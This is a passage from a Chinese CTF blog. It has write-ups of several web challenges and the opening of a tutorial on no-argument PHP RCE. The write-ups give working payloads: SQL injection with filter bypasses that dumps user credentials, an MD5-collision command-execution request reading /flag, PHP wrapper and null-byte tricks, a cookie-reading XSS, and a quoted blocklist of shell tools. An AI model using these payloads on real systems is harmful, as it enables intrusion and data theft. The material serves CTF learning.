                     data-src="https://img-blog.csdnimg.cn/20200416213748253.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>访问后发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--index.phps--&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])   <span class="comment">//不能为0</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))    <span class="comment">//不能出现.</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span>     <span class="comment">//data值确定</span></span><br><span class="line">   <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> 							<span class="comment">//id=0</span></span><br><span class="line">   <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> 					<span class="comment">//b的长度大于5</span></span><br><span class="line">   <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="comment">//正则</span></span><br><span class="line">   <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)					<span class="comment">//函数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看的出</p>
<p>​	data的值 利用php伪协议<code>a=data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==</code></p>
<p>​	id的值利用PHP弱类型    id &#x3D; 0e</p>
<p>看一下函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020041621435932.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p><code>substr</code>：这个函数很有名</p>
<p>它对于存在00截断的字符串 有着下面的操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;%00123&#x27;</span>,<span class="number">0</span>,<span class="number">1</span>));     <span class="comment">//string(1) &quot;&quot; </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1%00123&#x27;</span>,<span class="number">0</span>,<span class="number">1</span>));     <span class="comment">//string(1) &quot;1&quot;</span></span><br><span class="line"><span class="comment">//这里的有趣的地方在于 %00是占了字符的 但是又是空 &quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200416214256640.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>这里呢 正则在pattern，我们的被比较的字符串在第二个参数。</p>
<p>那么，我们就分析清楚了</p>
<p>那么综合上面说的，参数b的payload就出来了</p>
<p><code>b=%00111111</code></p>
<p>第一 字符数大于5  第二  1114 存在 111  第三  第一个字符为空不等于4</p>
<p>好的那么payload就应该为：</p>
<p><code>?id=0e&amp;a=data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==&amp;b=%00123322</code></p>
<p>访问后出现了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200416215628983.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<p>大概率目录 怎么也不像flag</p>
<p>访问————出现了hi666 还有url为<code>/?id=1</code></p>
<p>访问666 出现————&gt;<code>SELECT * FROM content WHERE id=666</code></p>
<p>那么我们可以看看是不是</p>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>看看注入天书。。。</p>
<p>首先 测试<code>id=1#</code> hi666 <code>id=1--+</code> 不是hi666 ——&gt;过滤了–+</p>
<p><code>id=1+# </code> 报错 ——过滤空格  <code>id=1/*2*/and/*2*/1=2</code> 很好测试成功</p>
<p>那么 爆库 爆表 爆列   一般来说 flag都在本数据库内部</p>
<p><code>selselectect/*2*/group_concat(table_name)/*2*/frofromm/*2*/information_schema.tables/*2*/where/*2*/table_schema=database()</code></p>
<p>中途遇到了过滤 尝试了双写可以绕过</p>
<p>得到了表名 只有一个 content   ——爆列</p>
<p><code>d=-1/*2*/ununionion/*2*/selselectect/*2*/1,2,(selselectect/*2*/group_concat(column_name)/*2*/frofromm/*2*/information_schema.columns/*2*/where/*2*/table_name=0x636f6e74656e74)</code></p>
<p>这里的时候 第一次没有过   测试之后 应该是表名被过滤了</p>
<p>利用十六进制绕过  <a class="link"   href="https://www.sojson.com/hexadecimal.html" >https://www.sojson.com/hexadecimal.html<i class="fas fa-external-link-alt"></i></a></p>
<p>得到列名</p>
<p><code>id=-1/*2*/ununionion/*2*/selselectect/*2*/1,2,(selselectect/*2*/group_concat(context)/*2*/frofromm/*2*/content)</code></p>
<p>最后得到flag。</p>
<p>总结一下 </p>
<p>其实整体上并不难不是吗？</p>
<p>但是就是写不出  sql注入 emm很简单的绕过确实</p>
<p>%00  是我对php字符理解不到位。</p>
<h2 id="2020-04-17"><a href="#2020-04-17" class="headerlink" title="2020.04.17"></a>2020.04.17</h2><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>整理整理payload</p>
<p>爆出表名</p>
<p><code>select+group_cooncat(table_name)+from+information_schema.tables+where+table_schema=database()</code></p>
<p>爆出列名</p>
<p><code>select/*2*/group_concat(column_name)/*2*/from/*2*/information_schema.columns/*2*/where/*2*/table_name=geekuser</code></p>
<p>爆出值</p>
<p><code>select+group_concat(id,0x3a,username,0x3a,password)+from+geekuser</code></p>
<p>这道题目 很基础 就是标准的注入步骤</p>
<p>我觉得 你要会开发 你的安全才懂得多一点</p>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>首先 太强了！</p>
<p>一进去 看到url是<code>http://2b4abd37-fbab-46d8-bfa1-6e68cfde5813.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p>
<p>img的值很像base64编码。所以我们直接测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0=</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">3535352e706e67   //这里是16进制 我每次都没想到</span><br><span class="line">555.png</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么很可能是这样转换获取文件的 network里data也是这样</p>
<p>那么尝试读取一下index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure>

<p>然后查看源码 我们解码可以看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">//两个参数都存在</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="comment">//file文件名字处理</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"><span class="comment">//不允许文件名中有[]存在</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="comment">//不允许直接读取文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//字符串不等 MD5值相等</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">//反引号命令执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们的利用点在反引号命令执行</p>
<h4 id="第一、MD5强相等"><a href="#第一、MD5强相等" class="headerlink" title="第一、MD5强相等"></a>第一、MD5强相等</h4><p>看人家wp的</p>
<p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</code></p>
<p><code>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p>
<h4 id="第二、命令执行绕过"><a href="#第二、命令执行绕过" class="headerlink" title="第二、命令执行绕过"></a>第二、命令执行绕过</h4><p>命令执行 ，就不要想着写代码了</p>
<p>它这个强制过滤，以往都是利用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ca&#x27;&#x27;t</span><br><span class="line">ca/t</span><br></pre></td></tr></table></figure>

<p>这题还有一个厉害的解法</p>
<p><code>sort /flag</code></p>
<p>结合一下过滤的函数来学习下命令</p>
<p><code>ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh</code></p>
<p>查看文件</p>
<p><code>more  less  head tail cat </code></p>
<p>那么我们的payload就出来了</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\t+/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;<span class="operator">=</span></span></span><br></pre></td></tr></table></figure>

<p>总结：MD5强匹配  命令执行绕过</p>
<h2 id="2020-04-19"><a href="#2020-04-19" class="headerlink" title="2020.04.19"></a>2020.04.19</h2><h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h3><p>考点：git泄露 反序列化xss</p>
<p>首先 xss</p>
<p>其次反序列化我明白</p>
<p>再其次git泄露很明显</p>
<p>一进去啥也没有，扫一扫</p>
<p>存在git泄露，那么githack</p>
<p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里要知道一点，没有可利用的类进行反序列化</p>
<p>那么我们只能原生类进行反序列化。</p>
<p>题目要求xss。</p>
<p><a class="link"   href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2" >https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2<i class="fas fa-external-link-alt"></i></a></p>
<p>看看如何使用xss</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200419185925519.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>很好不是吗。xss一般都是人家的cookie进行盗取</p>
<p>那么我们的xss代码就是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>之后就弹出来了。</p>
<p>我这里xss不太明白。需要学习学习——&gt;XSS篇</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>无参数RCE</title>
    <url>/2020/04/03/%E5%9B%9B%E6%9C%88/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>单独开一篇的原因是 我被这道题折磨了。。</p>
<p>首先 我看不懂正则表达式 然后我去找资料学习</p>
<p>学习正则时的网站</p>
<p><a class="link"   href="https://www.jb51.net/tools/zhengze.html" >https://www.jb51.net/tools/zhengze.html<i class="fas fa-external-link-alt"></i></a></p>
<p>学好了看明白了这道题目的过滤条件</p>
<p>然后我傻了。这我怎么操作？？</p>
<p>看了师傅的WP。 emm， 很好 无参RCE。</p>
<p>所以 这篇博文出来了。</p>
<p>好多师傅的博客写的很详细</p>
<span id="more"></span>

<p>附下几个师傅的链接：</p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.gem-love.com/ctf/530.html" >https://www.gem-love.com/ctf/530.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/cioi/p/12329362.html" >https://www.cnblogs.com/cioi/p/12329362.html<i class="fas fa-external-link-alt"></i></a></p>
<p>这篇来自：<a class="link"   href="https://www.cnblogs.com/wangtanzhi/p/12311239.html" >https://www.cnblogs.com/wangtanzhi/p/12311239.html<i class="fas fa-external-link-alt"></i></a></p>
<p>这几天做了几道无参数RCE的题目，这里来总结一下，以后忘了也方便再捡起来。<br>首先先来解释一下什么是无参数RCE：</p>
<p>形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></figure>

<p>分析一下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</span><br><span class="line">再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</span><br><span class="line"></span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure>

<p>因此，我们可以用这样一句话来解释无参数RCE：<br><strong>我们要使用不传入参数的函数来进行RCE</strong><br>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&#x27;a()&#x27;));可以使用</span><br><span class="line">print_r(scandir(&#x27;123&#x27;));不可以使用</span><br></pre></td></tr></table></figure>

<p>再形象一点，就是套娃嘛。。一层套一个函数来达到我们RCE的目的<br>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>*<strong>0*</strong>|***1***<strong>0x01 从代码开始分析</strong></p>
<p>我们先来看一下几天前刚做的一道题目：</p>
<p><strong>[GXYCTF2019]禁止套娃</strong><br>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们先来分析一下源码吧：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</span><br><span class="line">2：preg_match过滤了我们伪协议的可能</span><br><span class="line">3：preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数。只能匹配通过无参数的函数。</span><br><span class="line">4：最后一个preg_match正则匹配掉了et/na/info等关键字，很多函数都用不了</span><br><span class="line">5：eval($_GET[&#x27;exp&#x27;]); 典型的无参数RCE</span><br></pre></td></tr></table></figure>

<p>既然getshell基本不可能，那么考虑读源码看源码，flag应该就在flag.php我们想办法读取<br>首先需要得到当前目录下的文件scandir()函数可以扫描当前目录下的文件，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&#x27;.&#x27;)); ?&gt;</span><br></pre></td></tr></table></figure>

<p>那么问题就是如何构造scandir(‘.’)</p>
<p>这里再看函数<br>localeconv() 函数：<br>返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。</p>
<p>这里还有一个知识点：</p>
<p>current(localeconv())永远都是个点<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122739121-1009671401.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122739121-1009671401.png"
                      alt="img"
                ></a></p>
<p>那么我们第一步就解决了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>

<p>pos() 是current() 的别名。<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122746590-465028958.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122746590-465028958.png"
                      alt="img"
                ></a></p>
<p>现在的问题就是怎么读取倒数第二个数组呢？</p>
<p>看手册：<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122752930-1717233019.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122752930-1717233019.png"
                      alt="img"
                ></a></p>
<p>很明显，我们不能直接得到倒数第二组中的内容：</p>
<h4 id="三种方法："><a href="#三种方法：" class="headerlink" title="三种方法："></a>三种方法：</h4><p><strong>1.array_reverse()</strong></p>
<p>以相反的元素顺序返回数组</p>
